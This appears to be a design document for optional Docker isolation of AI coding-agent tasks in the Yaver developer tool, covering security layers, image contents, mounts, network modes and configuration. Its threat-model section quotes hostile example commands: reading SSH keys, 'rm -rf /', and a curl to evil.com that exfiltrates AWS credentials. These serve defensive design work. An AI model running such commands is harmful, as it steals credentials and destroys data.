# Container Architecture — Yaver Sandbox

> **Status**: Design document  
> **Scope**: Optional task-level containerization for security isolation and clean builds  
> **Non-goal**: Containerizing the agent itself — it always runs on the host

## Principle

The Yaver agent is a **host-native control plane**. It binds ports, proxies dev servers,
accesses Xcode/Gradle/GPU, manages tmux sessions, and bridges mobile devices. None of
that belongs in a container.

What **does** belong in a container: the untrusted code that AI agents generate and execute
during tasks. The sandbox is an **execution jail** — the agent orchestrates from outside,
dangerous code runs inside.

```
┌─────────────────────────────────────────────────────────────────────────┐
│  HOST (always native)                                                   │
│                                                                         │
│  Yaver Agent (:18080)                                                   │
│  ├── HTTP server, auth, relay, beacon                                   │
│  ├── Dev servers (Metro :8081, Vite :5173, Next :3000, Flutter :9100)   │
│  ├── Builds (xcodebuild, gradlew, hermesc)                              │
│  ├── Deploys (TestFlight, Play Store)                                   │
│  ├── Voice/Ollama (GPU — MPS on Mac, CUDA on Linux)                     │
│  ├── Tmux sessions (agent runner management)                            │
│  ├── Feedback/BlackBox (device event ingestion)                         │
│  └── ~/.yaver/ (config, certs, models, vault)                           │
│         │                                                               │
│         │  "run this task"                                              │
│         ▼                                                               │
│  ┌─────────────────────────────────────────────────────────────┐        │
│  │  CONTAINER (optional, per-task)                              │        │
│  │                                                              │        │
│  │  /workspace ← project dir (mounted)                         │        │
│  │  AI agent (claude, codex, aider) runs here                  │        │
│  │  Can read/write project files only                          │        │
│  │  No ~/.ssh, ~/.aws, ~/.config, ~/*, /etc                    │        │
│  │  API keys injected via env (whitelist)                      │        │
│  │  Resource-capped (CPU, memory)                              │        │
│  │  Network: host (default) or restricted                      │        │
│  └─────────────────────────────────────────────────────────────┘        │
└─────────────────────────────────────────────────────────────────────────┘
```

## What Gets Containerized (and What Doesn't)

### Containerized: AI task execution only

When a task is created (via mobile, MCP, or CLI), the agent decides whether to run
the AI runner (Claude Code, Codex, Aider, etc.) directly on the host or inside a
Docker container. This is the **only** thing containerization affects.

| Feature | Containerized? | Why |
|---------|:-:|------|
| Task execution (AI agents) | Optional | This is the sandbox target |
| Dev servers (Metro, Vite, Next, Flutter) | No | Phone connects to host ports via relay; container network isolation would break HMR/WebSocket |
| iOS builds (xcodebuild) | No | macOS-only, needs Keychain, provisioning profiles, Simulator |
| Android builds (Gradle) | No | Needs Android SDK, JAVA_HOME, signing keystore on host |
| Hermes bytecode compilation | No | Part of build pipeline, uses host `hermesc` binary |
| Push-to-device (bundle POST) | No | Agent HTTP handler, phone connects to host |
| TestFlight / Play Store deploy | No | Needs host credentials, `altool`, service account JSON |
| Voice / Ollama | No | GPU (MPS/CUDA), model files in ~/.yaver/models/ |
| Tmux session management | No | Host process table, PID tracking |
| Feedback / BlackBox | No | Device event ingestion, stored in ~/.yaver/ |
| Beacon / QUIC relay | No | UDP broadcast, QUIC tunnels — host networking |
| MCP server | No | Runs inside agent process |
| Session transfer | No | Reads ~/.claude/, ~/.aider/, host-specific state |

### Why dev servers can't be containerized

The dev server proxy flow is:

```
Phone → Relay → Agent :18080 → /dev/* reverse proxy → Metro :8081 (host)
```

Metro/Vite/Next bind to host ports. The phone's WebView loads content through the
agent's reverse proxy. If Metro ran inside a container, the agent couldn't proxy to
it without `--network host` (which defeats isolation) or complex port forwarding
(fragile, breaks HMR WebSockets).

The dev server is **started by the agent** (`devserver.go`) as a host process. It
watches the project directory for changes. Hot reload works because Metro/Vite detect
file changes on the host filesystem. This is fundamentally host-native.

### Why builds can't be containerized

- **Xcode**: macOS-only. Docker on Mac runs Linux VMs. `xcodebuild` requires Apple's
  kernel frameworks, Keychain for code signing, Simulator.app for testing.
- **Gradle/Android**: Technically possible in Docker but requires ~10GB Android SDK mount,
  JAVA_HOME configuration, and signing keystore from host. The complexity isn't worth it
  when builds are host-initiated and owner-only anyway.
- **Hermes**: `hermesc` is a host binary (platform-specific). Called during bundle
  compilation for push-to-device. Runs as part of the build pipeline, not as a task.
- **Flutter**: `flutter build` needs iOS/Android SDKs from host.

Builds are **always host operations**. They're triggered by the agent (or CLI), not by
guest tasks. Guests can't access `/exec` or build endpoints.

## Security Model

### Without containers (current default)

Guest tasks rely on **defense-in-depth** — multiple soft layers:

```
Layer 1: HTTP path allowlist     — guests can only hit /tasks, /feedback, /dev, etc.
Layer 2: Custom command block    — guests cannot run arbitrary shell commands
Layer 3: Runner restriction      — per-guest allowed runners (claude, aider, etc.)
Layer 4: WorkDir pinning         — guest tasks always run in agent's workDir, can't cd out
Layer 5: AI prompt prefix        — "[SECURITY CONTEXT — GUEST SESSION] ..." injected
Layer 6: Usage limits            — daily seconds, schedule windows, idle-only mode
```

This is good but not airtight. The AI prompt prefix tells Claude "never access ~/.ssh"
but a jailbroken or confused LLM could ignore it. WorkDir pinning prevents the task from
*starting* elsewhere, but the AI agent can still `cat /etc/passwd` if it wants to.

### With containers (opt-in)

Containerization adds a **hard kernel-level boundary** on top of the existing layers:

```
Layer 1-6: (same as above — still active)
Layer 7: Docker container
         ├── Filesystem: only /workspace mounted (project dir)
         ├── Environment: only whitelisted API keys
         ├── Resources: CPU/memory capped
         ├── Process: isolated PID namespace
         └── Network: host (default) or none/bridge (configurable)
```

Even if the AI agent is jailbroken and ignores the prompt prefix:
- `cat ~/.ssh/id_rsa` → file doesn't exist in container
- `rm -rf /` → destroys container, not host
- `curl evil.com/exfil?data=$(cat ~/.aws/credentials)` → file doesn't exist
- Fork bomb / crypto miner → capped by `--cpus` and `--memory`

## Container Image Design

### Base image: `yaver-sandbox`

Single image, built once, cached forever. Contains everything an AI agent needs to
write and test code. Does NOT contain build toolchains (Xcode, Android SDK, Flutter)
because those aren't needed for task execution.

```dockerfile
FROM node:22-bookworm-slim

# System: git, curl, build-essential, python3, java-headless, ruby, tmux, ripgrep
# Go: 1.22.x
# Rust: stable (minimal profile)
# AI agents: claude-code (npm), aider (pip)
# JS tooling: expo-cli, eas-cli
# Cache dirs: /root/.npm, .gradle, .cargo/registry, go/pkg/mod

WORKDIR /workspace
ENTRYPOINT ["/bin/bash", "-c"]
```

**What's in it:**
- Languages: Node 22, Python 3, Go 1.22, Rust stable, Java headless, Ruby
- AI agents: Claude Code, Aider (more can be added)
- Build tools: gcc, cmake, pkg-config (for native npm packages)
- Utilities: git, curl, jq, ripgrep, tmux, tree

**What's NOT in it:**
- Xcode, Android SDK, Flutter (too large, macOS-specific, not needed for tasks)
- Ollama (needs GPU, runs on host)
- User credentials (~/.ssh, ~/.aws — intentionally excluded)
- Yaver agent itself (runs on host)

### Per-project images: `Dockerfile.yaver`

Projects can override the base image by placing a `Dockerfile.yaver` in their root.
The agent auto-detects and builds it. Use cases:
- Project needs specific system libraries (libpq, imagemagick)
- Project needs a specific Node/Python version
- Project has special build requirements

```bash
# Auto-detected by ContainerRunner.DetectProjectImage()
# Built as: yaver-sandbox-<project-hash>
# Falls back to yaver-sandbox if no Dockerfile.yaver found
```

### Image size budget

| Component | Size |
|-----------|------|
| node:22-bookworm-slim base | ~200 MB |
| System packages | ~300 MB |
| Go 1.22 | ~150 MB |
| Rust stable (minimal) | ~400 MB |
| Claude Code + Aider | ~200 MB |
| **Total** | **~1.2 GB** |

Acceptable for a one-time build. Cached layers make rebuilds fast.

## Runtime: How a Containerized Task Runs

### Decision flow (in `startProcess()`)

```
startProcess(task):
  │
  ├── Is ContainerRunner available? (Docker installed + running)
  │   └── No → always run on host (direct execution)
  │
  ├── Is sandbox image ready? (yaver-sandbox built)
  │   └── No → always run on host
  │
  ├── Is this a guest task?
  │   ├── Yes + ContainerizeGuests enabled → CONTAINER
  │   └── Yes + ContainerizeGuests disabled → HOST (with prompt prefix)
  │
  ├── Is this a host task?
  │   ├── Yes + ContainerizeHost enabled → CONTAINER
  │   └── Yes + ContainerizeHost disabled → HOST
  │
  └── Default: HOST (direct execution, same as today)
```

### Container execution details

```bash
docker run --rm -i \
  --name yaver-task-<taskID> \
  \
  # Resource limits
  --cpus <config.ContainerCPU or "2.0"> \
  --memory <config.ContainerMemory or "4g"> \
  \
  # Project directory — the ONLY host path the task can see
  -v /path/to/project:/workspace \
  -w /workspace \
  \
  # Build caches — Docker named volumes, persist across tasks
  -v npm-cache:/root/.npm \
  -v gradle-cache:/root/.gradle \
  -v cargo-cache:/root/.cargo/registry \
  -v go-mod-cache:/root/go/pkg/mod \
  \
  # API keys — explicit whitelist only
  -e ANTHROPIC_API_KEY=sk-ant-... \
  -e OPENAI_API_KEY=sk-... \
  \
  # Optional extra mounts from config
  -v /opt/android-sdk:/opt/android-sdk:ro \
  \
  # Network — host by default (AI agents need internet for API calls)
  --network host \
  \
  yaver-sandbox \
  "claude --dangerously-skip-permissions -p 'fix the login bug' --output-format stream-json"
```

### What the container CAN access

| Path | Source | Mode | Purpose |
|------|--------|------|---------|
| `/workspace` | Host project dir | read-write | Project source code |
| `/root/.npm` | Docker volume `npm-cache` | read-write | npm dependency cache |
| `/root/.gradle` | Docker volume `gradle-cache` | read-write | Gradle dependency cache |
| `/root/.cargo/registry` | Docker volume `cargo-cache` | read-write | Cargo crate cache |
| `/root/go/pkg/mod` | Docker volume `go-mod-cache` | read-write | Go module cache |
| Extra mounts | Config `ContainerMounts` | configurable | Project-specific tools |

### What the container CANNOT access

| Path | Why excluded |
|------|-------------|
| `~/.ssh/` | SSH keys, git credentials |
| `~/.aws/` | AWS credentials |
| `~/.config/` | App configs, secrets |
| `~/.gnupg/` | GPG keys |
| `~/.yaver/` | Agent config, vault, certs |
| `~/` (anything else) | Home directory isolation |
| `/etc/` | System configuration |
| `/var/` | System state |
| Other project dirs | Only the task's project is mounted |

## Network Modes

The container's `--network` flag controls what the AI agent can reach:

| Mode | Use case | What works | What's blocked |
|------|----------|------------|----------------|
| `host` (default) | Normal tasks — AI agents need API access | Everything (same as host) | Nothing |
| `bridge` | Moderate isolation | Outbound internet (API calls) | Host services on localhost |
| `none` | Maximum lockdown | Only local /workspace | All network access |

**Default is `host`** because Claude Code, Codex, and Aider all need to call their
respective APIs over HTTPS. Switching to `bridge` or `none` is an advanced config
option for paranoid setups (e.g., air-gapped with local Ollama).

**Note**: Even with `--network host`, the container can't access host files — filesystem
isolation is independent of network isolation.

### Configuring network mode

```json
// ~/.yaver/config.json
{
  "container_network": "host"    // "host" | "bridge" | "none"
}
```

```bash
# Or via CLI
yaver serve --containerize-guests --container-network bridge
```

## Configuration

### CLI flags

```bash
yaver serve \
  --containerize-guests           # Guest tasks in containers (default: false)
  --containerize-host             # Host tasks in containers (default: false)
  --container-image myimage       # Custom image instead of yaver-sandbox
  --container-cpu 2.0             # CPU core limit per task
  --container-memory 4g           # Memory limit per task
  --container-network host        # Network mode: host|bridge|none
  --container-mount /sdk:/sdk:ro  # Extra mount (repeatable)
```

### Config file (`~/.yaver/config.json`)

```json
{
  "containerize_guests": false,
  "containerize_host": false,
  "container_image": "",
  "container_cpu": "2.0",
  "container_memory": "4g",
  "container_network": "host",
  "container_mounts": [
    "/opt/android-sdk:/opt/android-sdk:ro"
  ]
}
```

### HTTP API

```
GET  /sandbox/status   → { available, imageReady, dockerPath, imageName, config }
POST /sandbox/config   → update container settings at runtime
POST /sandbox/build    → trigger async image build
```

### Mobile / MCP

Sandbox status is included in `/agent/status` response so the mobile app can show
whether containerization is active. No mobile UI needed to toggle it — this is a
host-side admin decision.

## Build Cache Strategy

AI tasks frequently install dependencies (`npm install`, `pip install`, `cargo build`).
Without caching, every container task would re-download the internet.

**Solution: Docker named volumes** (already implemented in `ContainerRunner`)

```
npm-cache     → /root/.npm           # npm packages
gradle-cache  → /root/.gradle        # Gradle dependencies
cargo-cache   → /root/.cargo/registry # Rust crates
go-mod-cache  → /root/go/pkg/mod     # Go modules
```

These volumes persist across container runs. First task downloads everything; subsequent
tasks hit cache. Volumes are per-host (not per-project) so different projects share the
same dependency caches.

**Node modules**: The project's `node_modules/` is already in `/workspace` (mounted from
host). If it exists, the container uses it. If not, `npm install` populates it — and
because `/workspace` is mounted read-write, the installed modules persist on host too.

## Guest vs Host Containerization

| Aspect | Guest (`--containerize-guests`) | Host (`--containerize-host`) |
|--------|:---:|:---:|
| Purpose | Security — prevent guest damage | Clean builds — reproducible env |
| Default | Off (soft layers still active) | Off |
| Risk without it | Prompt injection could access host files | Low (host trusts themselves) |
| Recommended | Yes, when using guest access | Only if reproducibility matters |
| Network default | `host` | `host` |
| Resource limits | Enforced (CPU, memory, daily seconds) | Optional |

### Recommendation

- **Guests enabled + concerned about security** → turn on `--containerize-guests`
- **Solo developer, no guests** → no containerization needed
- **Want clean/reproducible builds** → turn on `--containerize-host`
- **Shared GPU machine (multi-user)** → `--containerize-guests` + resource limits

## Interaction with Existing Security Layers

Containerization is **additive** — it doesn't replace any existing layer:

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                  │
│  Layer 1: HTTP path allowlist (httpserver.go)                    │  ← still active
│  Layer 2: Custom command block (createTask)                      │  ← still active
│  Layer 3: Runner restriction (GuestConfigManager.CheckRunner)    │  ← still active
│  Layer 4: WorkDir pinning (tasks.go:1268)                        │  ← still active
│  Layer 5: AI prompt prefix (guestPromptPrefix)                   │  ← still active
│  Layer 6: Usage limits (daily seconds, schedule, idle-only)      │  ← still active
│  Layer 7: Docker container (filesystem/process/resource isolation)│  ← NEW, optional
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

If containerization is disabled, layers 1-6 remain the security boundary (current behavior).
If enabled, layer 7 makes layers 4-5 redundant in practice — but they stay active as
defense-in-depth.

## Edge Cases

### Task needs git push/pull

AI agents inside containers may need git access (clone repos, push fixes). Options:

1. **Default**: Git works within `/workspace` (mounted project). `git status`, `git diff`,
   `git commit` all work. `git push` works if the project's `.git/config` has HTTPS
   credentials cached (they're inside the project dir).

2. **SSH git**: Won't work by default (no `~/.ssh` mounted). If needed, the host can add
   `~/.ssh:/root/.ssh:ro` to `container_mounts`. This is an explicit opt-in that trades
   security for convenience.

3. **Git credential helper**: If the project uses `git credential-store` with a file inside
   the project dir, it works. Global credential helpers (`~/.gitconfig`) aren't available.

### Task needs to start a local server (e.g., `npm start` for testing)

With `--network host`, any server started inside the container binds to host ports.
This works but could conflict with existing services. With `--network bridge`, the server
is only reachable inside the container (fine for `curl localhost:3000` within the task).

### Task generates build artifacts

Build outputs (binaries, bundles, reports) land in `/workspace` which is the mounted
project dir. They persist on host after the container exits. No special handling needed.

### Multiple concurrent tasks

Each task gets its own container (`yaver-task-<taskID>`). They share cache volumes but
have isolated filesystems and process namespaces. Resource limits are per-container.

### Container crash / OOM kill

The agent monitors the `docker run` process. If it exits non-zero (including OOM kill),
the existing auto-restart logic kicks in (up to 4 retries with exponential backoff).
The container is `--rm` so it's cleaned up automatically.

### Docker not installed

Everything works exactly as today. `ContainerRunner.IsAvailable()` returns false,
all tasks run directly on host. No degradation, no warnings unless the user explicitly
asked for containerization.

## Implementation Plan

### What already exists (working)

| Component | File | Status |
|-----------|------|--------|
| `ContainerRunner` struct | `container_runner.go` | Done |
| `IsAvailable()`, `IsImageReady()` | `container_runner.go` | Done |
| `BuildImage()` | `container_runner.go` | Done |
| `RunTask()` with volume mounts, env, limits | `container_runner.go` | Done |
| `StopContainer()` | `container_runner.go` | Done |
| `CollectAPIKeys()` whitelist | `container_runner.go` | Done |
| `DetectProjectImage()` (Dockerfile.yaver) | `container_runner.go` | Done |
| `Dockerfile.sandbox` base image | `Dockerfile.sandbox` | Done |
| CLI: `yaver sandbox build/status` | `sandbox_cmd.go` | Done |
| Config fields (ContainerizeGuests/Host, CPU, Memory, Mounts) | `config.go` | Done |
| CLI flags (`--containerize-guests`, `--containerize-host`) | `main.go` | Done |
| Startup wiring (ContainerRunner → TaskManager + HTTPServer) | `main.go` | Done |
| Container decision in `startProcess()` | `tasks.go` | Done |
| Container execution path (build opts → docker run → stream output) | `tasks.go` | Done |
| Cache volumes (npm, gradle, cargo, go-mod) | `container_runner.go` | Done |

### What needs refinement

| Item | Description | Effort |
|------|-------------|--------|
| Network mode config | Add `container_network` to config + CLI flag | Small |
| Sandbox HTTP endpoints | Wire `/sandbox/status`, `/sandbox/config`, `/sandbox/build` if not yet routed | Small |
| Image auto-build on first use | If `containerize_*` enabled but image missing, auto-build (with user notification) | Small |
| Per-guest resource limits | Map `GuestConfigManager` CPU/memory limits into `ContainerTaskOpts` | Small |
| Container cleanup on agent shutdown | `StopContainer()` for all running task containers | Small |
| GPU passthrough for Linux | `--gpus all` flag when running on Linux with NVIDIA | Medium |
| Healthcheck in Dockerfile | `HEALTHCHECK` instruction for monitoring | Trivial |
| Rootless container option | Support podman / rootless docker for extra security | Medium |
| Seccomp / AppArmor profiles | Restrict syscalls inside container (block `mount`, `ptrace`, etc.) | Medium |
| Read-only root filesystem | `--read-only` + tmpfs for /tmp — prevents writes outside /workspace | Small |

### Not planned

| Item | Why |
|------|-----|
| Containerize the agent | Agent is the control plane — must be host-native |
| Containerize dev servers | Phone connects to host ports, would break hot reload |
| Containerize builds | Xcode is macOS-only, Gradle needs host SDK paths |
| Ollama in container | Loses GPU on Mac; on Linux, host Ollama is simpler |
| Nested containers (DinD) | Too complex, security risk, not needed |
| Kubernetes/orchestration | Yaver runs on dev machines, not clusters |

## Future: GPU Container Support (Linux Only)

On Linux GPU machines (the $449/mo tier), tasks could benefit from GPU access for
local model inference. This is a future enhancement:

```bash
docker run --rm -i \
  --gpus all \                              # NVIDIA GPU passthrough
  --name yaver-task-<taskID> \
  -v /path/to/project:/workspace \
  -e OLLAMA_HOST=host.docker.internal:11434 \  # Or run Ollama in container
  yaver-sandbox-gpu \
  "claude --model ollama/qwen2.5-coder ..."
```

Two approaches:
1. **Ollama on host** (simpler): Container talks to `host.docker.internal:11434`
2. **Ollama in container** (isolated): Requires `nvidia/cuda` base image, ~8GB larger

Recommend approach 1. Ollama is a shared service, not per-task. Keep it on host.

## Summary

| Question | Answer |
|----------|--------|
| What gets containerized? | AI task execution only (Claude Code, Codex, Aider commands) |
| What stays on host? | Agent, dev servers, builds, deploys, voice, tmux, feedback |
| Is it on by default? | No. Fully optional. Everything works without Docker. |
| Does it break anything? | No. When disabled, behavior is identical to today. |
| When should I enable it? | When using guest access and you want hard security boundaries |
| What image is used? | `yaver-sandbox` (built via `yaver sandbox build`) |
| Can projects customize it? | Yes — `Dockerfile.yaver` in project root auto-detected |
| How big is the image? | ~1.2 GB (Node, Python, Go, Rust, Claude Code, Aider) |
| What about build caches? | Docker named volumes persist npm/gradle/cargo/go caches |
| Network access? | `host` by default (AI agents need API calls). Configurable. |
